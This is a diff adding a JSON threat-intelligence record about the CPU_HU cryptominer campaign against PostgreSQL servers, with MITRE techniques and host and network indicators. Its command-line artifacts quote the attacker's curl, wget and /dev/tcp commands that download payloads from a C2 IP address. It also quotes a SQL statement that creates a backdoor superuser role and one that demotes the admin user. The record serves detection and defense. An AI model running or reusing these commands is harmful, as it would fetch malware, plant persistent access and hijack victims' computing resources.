@@ -1,0 +1,311 @@
+{
+  "malware_family": "CPU_HU",
+  "threat_actor": "JINX-0126",
+  "platforms": [
+    "linux"
+  ],
+  "summary": "JINX-0126 targets publicly exposed PostgreSQL servers with weak credentials to deploy a cryptominer. The malware, dubbed CPU_HU, uses a multi-stage infection with binaries like 'postmaster' and 'cpu_hu' to ultimately deploy an XMRig-C3 miner. It employs defense evasion through fileless execution, masquerading, and appending unique-per-victim configurations to its binaries.",
+  "mitre_techniques": [
+    "T1110.003",
+    "T1190",
+    "T1059.004",
+    "T1082",
+    "T1071.001",
+    "T1105",
+    "T1070.004",
+    "T1036.005",
+    "T1027.002",
+    "T1027.001",
+    "T1053.003",
+    "T1136",
+    "T1098",
+    "T1564.001",
+    "T1620",
+    "T1496"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "file_name",
+      "value": "pg_core",
+      "context": "First-stage dropper binary downloaded via curl/wget.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "postmaster",
+      "context": "Second-stage loader, UPX-packed Go binary masquerading as PostgreSQL process.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "cpu_hu",
+      "context": "Final payload, a UPX-packed Go binary that loads the miner.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/tmp/...",
+      "context": "Miner configuration file created by cpu_hu.",
+      "specificity": "medium",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/var/lib/postgresql/data/pg_hba.conf",
+      "context": "Legitimate PostgreSQL config file modified by malware for persistence.",
+      "specificity": "low",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "zsvc",
+      "context": "Process of a competing cryptominer terminated by the initial dropper script.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "pdefenderd",
+      "context": "Process of a competing cryptominer terminated by the initial dropper script.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "kinsing",
+      "context": "Process of a competing cryptominer terminated by the initial dropper script.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "kdevtmpfsi",
+      "context": "Process of a competing cryptominer terminated by the initial dropper script.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "curl -ksS 159.223.123.175:36287/JzICbeMxNQHwfwHLiCOFnumixtqYBv -o pg_core",
+      "context": "Executed by initial dropper script to download first stage payload.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "wget -q -Opg_core 159.223.123.175:36287/JzICbeMxNQHwfwHLiCOFnumixtqYBv",
+      "context": "Executed by initial dropper script to download first stage payload.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "echo 'exec 5<>/dev/tcp/159.223.123.175/36287; echo \"GET /HbLzilWbYDNEpWUdlDdjfdiYTChuDj HTTP/1.1\" >&5; echo \"host: 159.223.123.175\" >&5; echo >&5; (while read line;do [[ \"$line\" == $(printf \"\\015\") ]] && break; done && cat) <&5 > postmaster; exec 5>&-' | bash",
+      "context": "Command to download the 'postmaster' binary.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "sh -c \"printf ::::42Jz0wVPBAsW329::::VXssAL7FE0j5QG4T7cLgmn/VTADoqlvAlDqUiueQYJXy+P5Ysz9YvLS6yML0euUNaHAhwWeXD2/Q51sjeYVQ4vc3UQHvfC8rFujLeIE3vT9uPdPSnjZwRH8X1xvEXqeQPHKL1Vv9PaWu6lrzdtDQECt0LTcz15zWHmAHAUhH4fsM/QrZHZfuJB9zX0W5eS+IrRV2Li6aPfqfYkP/D371mPtKCq9i5l9tn2VWlsDcGesOdh2zS+iD5GrvrwXWhTDvgH2xpvL5Am1DDnKU/ftll3+s0/NFBJMRZ807VHu3h8qidkU8N1z4Wqz4XO03uZ1aUZtsY+GbeC57EvSWYkcLnnvQqPT4qBCipQjYI+ogtzcBlSmFc7eP/a8odDaN3HvC >> postmaster 2>&1 || exit 0\"",
+      "context": "Command to append encrypted config to the 'postmaster' binary.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "pоstgres: replication launcher",
+      "context": "Masquerading command line used by postmaster (contains Cyrillic 'о').",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "CREATE ROLE psql_sys WITH LOGIN SUPERUSER PASSWORD '759686ac19adbd08b94cf53f35afdd1e';",
+      "context": "PostgreSQL command to create a new superuser for persistence.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "ALTER USER \"admin\" WITH NOSUPERUSER NOCREATEROLE",
+      "context": "PostgreSQL command to weaken the default 'admin' user.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "7C6643CC24859542CE37615341E7712E82B4167528688877FE7C14648909DCD5",
+      "context": "Hardcoded AES key used to encrypt the configuration appended to postmaster.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "config_marker",
+      "value": "::::42Jz0wVPBAsW329::::",
+      "context": "Start marker for encrypted configuration appended to the postmaster binary.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "config_marker",
+      "value": "::::9XLOMQh7RZ3Tf1Xo8::::",
+      "context": "Start marker for base64 encoded configuration appended to cpu_hu binary.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "psql_sys",
+      "context": "Name of the superuser role created for persistence.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "pgg_superadmins",
+      "context": "String written to pg_hba.conf to reject connections.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "postgres_superadmins",
+      "context": "String written to pg_hba.conf to reject connections.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "ip",
+      "value": "159.223.123.175:36287",
+      "context": "C2 server for downloading first and second stage payloads.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/JzICbeMxNQHwfwHLiCOFnumixtqYBv",
+      "context": "URI path for downloading the pg_core binary.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/HbLzilWbYDNEpWUdlDdjfdiYTChuDj",
+      "context": "URI path for downloading the postmaster binary.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "mine.c3pool.com:13333",
+      "context": "Cryptomining pool.",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "XMRig-C3"
+    },
+    {
+      "kind": "other",
+      "value": "4A5ZWpHM6BXS8YF7xNfjXA5ctDjTC3GBwS4ESBV9X2BGVJV8vkfXBeZfXG6w2hmdkpZaogCXiqU4DYPXn3TtPRAGJBLQ7N5",
+      "context": "Attacker's Monero wallet address.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "47pt9WzQyugFQpSAwcGN2k8JHiMQ3fRZ3BQqmnYJtcejVq9adfiwVSWgrpmxiYTxvvWcHv5dD2iCaiBYiK4atkMSUGMXdx8",
+      "context": "Attacker's Monero wallet address.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "463TBt8Rn1qXWZDpTV4ydxQcZnkJNeLv6JRKjFbzFsY3MQZaxWsUgQF4QnxNAg8MGSPsiLn9faTWqRafHnhh3QBdSLTgRHA",
+      "context": "Attacker's Monero wallet address.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [],
+  "file_types": [
+    "elf",
+    "script"
+  ]
+}
